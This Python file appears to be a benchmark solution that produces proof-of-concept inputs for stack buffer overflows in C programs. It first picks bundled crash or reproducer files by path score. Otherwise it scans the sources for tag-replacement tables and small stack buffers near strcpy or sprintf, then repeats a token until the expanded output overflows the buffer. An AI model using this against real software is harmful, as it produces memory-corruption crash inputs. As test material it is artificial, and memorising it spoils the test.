import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Tuple


@dataclass
class FileEntry:
    path: str
    data: bytes


def _iter_files_from_dir(root: str, max_file_size: int = 2_000_000) -> Iterable[FileEntry]:
    for base, _, files in os.walk(root):
        for fn in files:
            p = os.path.join(base, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if not os.path.isfile(p) or st.st_size <= 0 or st.st_size > max_file_size:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            rel = os.path.relpath(p, root)
            yield FileEntry(rel.replace("\\", "/"), data)


def _iter_files_from_tar(tar_path: str, max_file_size: int = 2_000_000) -> Iterable[FileEntry]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            yield FileEntry(m.name, data)


def _iter_files(src_path: str, max_file_size: int = 2_000_000) -> Iterable[FileEntry]:
    if os.path.isdir(src_path):
        yield from _iter_files_from_dir(src_path, max_file_size=max_file_size)
        return
    yield from _iter_files_from_tar(src_path, max_file_size=max_file_size)


def _is_probably_text(data: bytes) -> bool:
    if not data:
        return False
    if b"\x00" in data:
        return False
    sample = data[:4096]
    printable = 0
    for b in sample:
        if b in (9, 10, 13) or 32 <= b <= 126:
            printable += 1
    return printable / max(1, len(sample)) >= 0.85


def _path_score_for_poc(path: str) -> int:
    p = path.lower()
    base = os.path.basename(p)
    score = 0
    if "crash" in p:
        score += 50
    if "poc" in p:
        score += 45
    if "repro" in p or "reproducer" in p:
        score += 40
    if "overflow" in p:
        score += 30
    if "stack" in p:
        score += 25
    if "asan" in p or "ubsan" in p or "sanit" in p:
        score += 20
    if "id:" in p or "id_" in p or "id-" in p:
        score += 22
    if "/fuzz" in p or p.startswith("fuzz") or "/corpus" in p or "/seeds" in p:
        score += 18
    if "/test" in p or p.startswith("test") or "/tests" in p:
        score += 10
    if base.endswith((".poc", ".repro", ".crash", ".bin", ".dat")):
        score += 12
    if base.startswith("crash-") or base.startswith("poc") or base.startswith("repro"):
        score += 15
    return score


def _c_unescape_to_bytes(s: str) -> bytes:
    out = bytearray()
    i = 0
    n = len(s)
    while i < n:
        ch = s[i]
        if ch != "\\":
            out.append(ord(ch) & 0xFF)
            i += 1
            continue
        i += 1
        if i >= n:
            out.append(ord("\\"))
            break
        esc = s[i]
        i += 1
        if esc == "n":
            out.append(10)
        elif esc == "r":
            out.append(13)
        elif esc == "t":
            out.append(9)
        elif esc == "b":
            out.append(8)
        elif esc == "f":
            out.append(12)
        elif esc == "v":
            out.append(11)
        elif esc == "a":
            out.append(7)
        elif esc == "\\":
            out.append(92)
        elif esc == "'":
            out.append(39)
        elif esc == '"':
            out.append(34)
        elif esc == "x":
            # hex escape: \xNN...
            h = []
            while i < n and len(h) < 2 and s[i] in "0123456789abcdefABCDEF":
                h.append(s[i])
                i += 1
            if h:
                out.append(int("".join(h), 16) & 0xFF)
            else:
                out.append(ord("x"))
        elif esc.isdigit():
            # octal escape: up to 3 digits, esc already one digit
            o = [esc]
            while i < n and len(o) < 3 and s[i].isdigit():
                o.append(s[i])
                i += 1
            try:
                out.append(int("".join(o), 8) & 0xFF)
            except Exception:
                out.append(ord(esc) & 0xFF)
        else:
            out.append(ord(esc) & 0xFF)
    return bytes(out)


def _decode_best_effort(data: bytes) -> str:
    try:
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return data.decode("latin-1", errors="ignore")


def _detect_tag_syntax(all_text: str) -> Tuple[bytes, bytes]:
    angle = len(re.findall(r"==\s*'<'|case\s*'<'|\*\s*\w+\s*==\s*'<'", all_text))
    angle += all_text.count("strchr(") * 0
    entity = len(re.findall(r"==\s*'&'|case\s*'&'|\*\s*\w+\s*==\s*'&'", all_text))
    semi = len(re.findall(r"==\s*';'|case\s*';'", all_text))
    ltgt = all_text.count("<") + all_text.count(">")
    amp = all_text.count("&") + all_text.count(";")
    # Prefer entity only if explicit '&' + ';' style is strongly indicated
    if (entity > angle and semi > 0) or (amp > ltgt * 1.3 and semi > 0 and entity > 0):
        return b"&", b";"
    return b"<", b">"


def _extract_tag_replacements(all_text: str) -> List[Tuple[str, int, Optional[bytes]]]:
    # Returns list of (name, repl_len, token_if_full)
    results: Dict[str, Tuple[int, Optional[bytes]]] = {}
    # Pair initializer { "name", "replacement", ... }
    pair_re = re.compile(
        r'\{\s*"((?:[^"\\]|\\.){1,128})"\s*,\s*"((?:[^"\\]|\\.){0,4096})"\s*[^}]*\}',
        re.DOTALL,
    )
    for m in pair_re.finditer(all_text):
        n_raw = m.group(1)
        r_raw = m.group(2)
        name_bytes = _c_unescape_to_bytes(n_raw)
        repl_bytes = _c_unescape_to_bytes(r_raw)
        if not name_bytes or b"\x00" in name_bytes or b"\x00" in repl_bytes:
            continue
        if len(name_bytes) > 64:
            continue
        try:
            name = name_bytes.decode("ascii", errors="ignore")
        except Exception:
            continue
        name = name.strip()
        if not name or len(name) > 64:
            continue
        # Determine if name looks like a full token already
        token_if_full = None
        if (name_bytes.startswith(b"<") and b">" in name_bytes) or (name_bytes.startswith(b"&") and name_bytes.endswith(b";")):
            token_if_full = name_bytes
        # Record max replacement length seen
        prev = results.get(name)
        rlen = len(repl_bytes)
        if rlen <= 0:
            continue
        if prev is None or rlen > prev[0]:
            results[name] = (rlen, token_if_full)

    # Also collect names from strcmp(tag, "NAME") to have fallbacks
    cmp_re = re.compile(r"(?:strcase?cmp|strcmp)\s*\(\s*[A-Za-z_]\w*\s*,\s*\"((?:[^\"\\]|\\.){1,128})\"\s*\)")
    for m in cmp_re.finditer(all_text):
        n_raw = m.group(1)
        name_bytes = _c_unescape_to_bytes(n_raw)
        if not name_bytes or b"\x00" in name_bytes or len(name_bytes) > 64:
            continue
        try:
            name = name_bytes.decode("ascii", errors="ignore").strip()
        except Exception:
            continue
        if not name:
            continue
        if name not in results:
            results[name] = (0, None)

    # Convert to list, prioritize those with known replacement length
    out: List[Tuple[str, int, Optional[bytes]]] = []
    for name, (rlen, token_if_full) in results.items():
        out.append((name, rlen, token_if_full))
    out.sort(key=lambda x: (x[1], -len(x[0])), reverse=True)
    return out


def _estimate_output_buffer_size(all_text: str) -> Optional[int]:
    # Heuristic: find stack arrays with sizes, score by nearby unsafe string ops and mention of tag parsing.
    arr_re = re.compile(
        r"(?:^|[;\{\}\n])\s*(?:unsigned\s+)?(?:char|uint8_t|int8_t)\s+([A-Za-z_]\w*)\s*\[\s*(\d{2,6})\s*\]\s*;",
        re.MULTILINE,
    )
    unsafe_markers = ("strcpy", "strcat", "sprintf", "vsprintf", "memcpy", "memmove")
    tag_markers = ("tag", "Tag", "TAG", "entity", "Entity", "html", "HTML")
    best = None  # (score, size)
    for m in arr_re.finditer(all_text):
        name = m.group(1)
        try:
            size = int(m.group(2))
        except Exception:
            continue
        if size < 64 or size > 262144:
            continue
        start = max(0, m.start() - 2000)
        end = min(len(all_text), m.end() + 4000)
        window = all_text[start:end]
        score = 0
        # buffer name heuristic
        lname = name.lower()
        if any(k in lname for k in ("out", "dst", "dest", "buf", "buffer", "result", "tmp")):
            score += 4
        if any(k in window for k in unsafe_markers):
            score += 10
        if any(k in window for k in tag_markers):
            score += 4
        # Prefer typical small stack buffers
        if 128 <= size <= 16384:
            score += 3
        # Penalize huge buffers unless very strongly indicated
        if size > 32768:
            score -= 4
        if best is None or score > best[0] or (score == best[0] and size < best[1]):
            best = (score, size)
    if best is None:
        return None
    # Require at least some confidence
    if best[0] < 7:
        return None
    return best[1]


class Solution:
    def solve(self, src_path: str) -> bytes:
        # 1) Try to find an included PoC / crash reproducer file.
        poc_candidates: List[Tuple[int, int, str, bytes]] = []
        text_blobs: List[str] = []
        total_text_bytes = 0

        for fe in _iter_files(src_path, max_file_size=2_000_000):
            p = fe.path
            data = fe.data

            sc = _path_score_for_poc(p)
            if sc > 0 and 0 < len(data) <= 200_000:
                # Favor smaller candidates if similarly scored
                poc_candidates.append((sc, len(data), p, data))

            # Gather source text for analysis
            ext = os.path.splitext(p.lower())[1]
            if ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"):
                if len(data) <= 2_000_000 and _is_probably_text(data):
                    if total_text_bytes < 15_000_000:
                        text_blobs.append(_decode_best_effort(data))
                        total_text_bytes += len(data)

        if poc_candidates:
            poc_candidates.sort(key=lambda x: (-x[0], x[1], x[2]))
            return poc_candidates[0][3]

        # 2) Static synthesis based on source heuristics.
        all_text = "\n".join(text_blobs) if text_blobs else ""
        start_delim, end_delim = _detect_tag_syntax(all_text)

        tags = _extract_tag_replacements(all_text)

        # Choose best tag token and replacement length estimate
        chosen_token: Optional[bytes] = None
        chosen_rlen = 0

        def wrap_name(name: str) -> bytes:
            nb = name.encode("ascii", errors="ignore")
            return start_delim + nb + end_delim

        for name, rlen, token_if_full in tags[:2000]:
            if token_if_full is not None:
                tok = token_if_full
            else:
                if not name or any(c.isspace() for c in name):
                    continue
                tok = wrap_name(name)
            if not tok or b"\x00" in tok or len(tok) > 128:
                continue
            # Favor tags with known big replacements; otherwise keep as fallback.
            score = rlen
            if score <= 0:
                score = 1
            if chosen_token is None or score > chosen_rlen or (score == chosen_rlen and len(tok) < len(chosen_token)):
                chosen_token = tok
                chosen_rlen = score

        if chosen_token is None:
            # Fallback token guess if no tags found
            chosen_token = b"<a>" if start_delim == b"<" else (b"&lt;" if start_delim == b"&" else b"<a>")
            chosen_rlen = 4

        # Estimate output buffer size and choose repetitions
        buf_size = _estimate_output_buffer_size(all_text)
        if buf_size is None:
            buf_size = 2048

        # Target enough expansion to overflow typical stack buffers even if our estimate is off
        target_out = max(16384, min(262144, buf_size * 8))
        rlen = max(1, chosen_rlen)

        reps = (target_out + rlen - 1) // rlen + 8
        tok_len = len(chosen_token)
        max_input = 900_000
        if tok_len * reps > max_input:
            reps = max(1, max_input // max(1, tok_len))

        # Construct PoC
        poc = chosen_token * reps + b"\n"
        return poc